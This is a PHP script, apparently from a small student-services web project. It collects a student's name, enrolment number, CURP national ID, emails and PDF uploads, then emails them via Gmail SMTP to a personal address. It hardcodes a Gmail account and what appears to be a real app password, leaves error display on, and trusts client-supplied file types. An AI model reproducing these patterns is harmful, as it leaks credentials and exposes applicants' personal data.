<?php
// Import PHPMailer classes into the global namespace
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'PHPMailer/Exception.php';
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';

// Configuración de errores
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Verificar si los datos del formulario están presentes
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Validar y sanitizar los datos del formulario
    $nombre = filter_input(INPUT_POST, 'nombre', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $apellido_P = filter_input(INPUT_POST, 'apellido_P', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $apellido_M = filter_input(INPUT_POST, 'apellido_M', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $numero_boleta = filter_input(INPUT_POST, 'Numero_boleta', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $semestre = filter_input(INPUT_POST, 'semestre', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $correo_personal = filter_input(INPUT_POST, 'Correo_Personal', FILTER_SANITIZE_EMAIL) ?? 'No especificado';
    $clave_curp = filter_input(INPUT_POST, 'Clave_Curp', FILTER_SANITIZE_STRING) ?? 'No especificado';
    $correo_institucional = filter_input(INPUT_POST, 'Correo_Institucional', FILTER_SANITIZE_EMAIL) ?? 'No especificado';

    // Validar correos electrónicos
    if (!filter_var($correo_personal, FILTER_VALIDATE_EMAIL)) {
        die("El correo personal no es válido");
    }
    
    if (!filter_var($correo_institucional, FILTER_VALIDATE_EMAIL)) {
        die("El correo institucional no es válido");
    }

    // Crear directorio de uploads si no existe
    $uploadDir = __DIR__ . '/uploads/';
    if (!file_exists($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }

    // Manejo de archivos subidos
    $archivos_subidos = [];
    if (!empty($_FILES['documentos']['name'][0])) {
        foreach ($_FILES['documentos']['tmp_name'] as $key => $tmp_name) {
            $file_name = basename($_FILES['documentos']['name'][$key]);
            $file_tmp = $_FILES['documentos']['tmp_name'][$key];
            $file_size = $_FILES['documentos']['size'][$key];
            $file_path = $uploadDir . $file_name;

            // Verificar si el archivo es un PDF (por extensión y MIME type)
            $file_type = $_FILES['documentos']['type'][$key];
            $file_ext = strtolower(pathinfo($file_name, PATHINFO_EXTENSION));
            
            if ($file_ext !== 'pdf' || $file_type !== 'application/pdf') {
                die("El archivo $file_name no es un PDF válido.");
            }

            // Verificar tamaño del archivo (3.4 MB máximo)
            if ($file_size > 3481600) {
                die("El archivo $file_name es demasiado grande. Máximo 3.4MB permitidos.");
            }

            // Mover archivo a directorio uploads
            if (move_uploaded_file($file_tmp, $file_path)) {
                $archivos_subidos[] = $file_path;
            } else {
                die("Error al subir el archivo: $file_name");
            }
        }
    } else {
        die("Debes subir al menos un archivo PDF.");
    }

    // Crear una instancia de PHPMailer
    $mail = new PHPMailer(true);

    try {
        // Configuración del servidor SMTP
        $mail->SMTPDebug = SMTP::DEBUG_OFF;
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'Canelooctubre@gmail.com'; // Cambiar por tu correo
        $mail->Password   = 'rszfieakydnabnrl';       // Cambiar por tu contraseña de aplicación
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
        $mail->Port       = 587;

        // Remitente
        $mail->setFrom('Canelooctubre@gmail.com', 'Ingeniero Mendez');
        
        // Destinatario principal (corregido el correo duplicado)
        $mail->addAddress('victormanueldehenaulloa@gmail.com', 'Victor');
        
        // Opcional: Añadir CC o BCC
        // $mail->addCC('cc@example.com');
        // $mail->addBCC('bcc@example.com');

        // Adjuntar archivos
        foreach ($archivos_subidos as $archivo) {
            $mail->addAttachment($archivo);
        }

        // Contenido del correo
        $mail->isHTML(true);
        $mail->Subject = 'Recupaeracion de Correo Institucional por Baja';
        $mail->Body = "
            <html>
            <head>
                <style>
                    body { font-family: Arial, sans-serif; line-height: 1.6; }
                    h2 { color: #2c3e50; }
                    p { margin: 5px 0; }
                    strong { color: #2c3e50; }
                </style>
            </head>
            <body>
                <h2>Recupaeracion de Correo Institucional por Baja</h2>
                <p><strong>Nombre completo:</strong> $nombre $apellido_P $apellido_M</p>
                <p><strong>Número de Boleta:</strong> $numero_boleta</p>
                <p><strong>Semestre:</strong> $semestre</p>
                <p><strong>Correo Institucional:</strong> $correo_institucional</p>
                <p><strong>Correo Personal:</strong> $correo_personal</p>
                <p><strong>Clave CURP:</strong> $clave_curp</p>
                <p><strong>Archivos Adjuntos:</strong> " . count($archivos_subidos) . " archivo(s) PDF</p>
            </body>
            </html>
        ";

        // Versión alternativa de texto plano
        $mail->AltBody = "Recupaeracion de Correo Institucional por Baja\n\n" .
                         "Nombre: $nombre $apellido_P $apellido_M\n" .
                         "Boleta: $numero_boleta\n" .
                         "Semestre: $semestre\n" .
                         "Correo Institucional: $correo_institucional\n" .
                         "Correo Personal: $correo_personal\n" .
                         "CURP: $clave_curp\n" .
                         "Archivos adjuntos: " . count($archivos_subidos) . " PDF(s)";

        // Enviar el correo
        if ($mail->send()) {
            // Limpiar archivos subidos después del envío
            foreach ($archivos_subidos as $archivo) {
                if (file_exists($archivo)) {
                    unlink($archivo);
                }
            }
            
            // Redirigir con mensaje de éxito
            header("Location: Fase1.php?success=1");
            exit();
        } else {
            throw new Exception('Error al enviar el correo');
        }
    } catch (Exception $e) {
        // Limpiar archivos en caso de error
        foreach ($archivos_subidos as $archivo) {
            if (file_exists($archivo)) {
                unlink($archivo);
            }
        }
        
        // Registrar el error
        error_log("Error al enviar correo: " . $e->getMessage());
        
        // Redirigir con mensaje de error
        header("Location: Fase2.php?error=1");
        exit();
    }
} else {
    // Redirigir si no es una solicitud POST
    header("Location: Fase1.php");
    exit();
}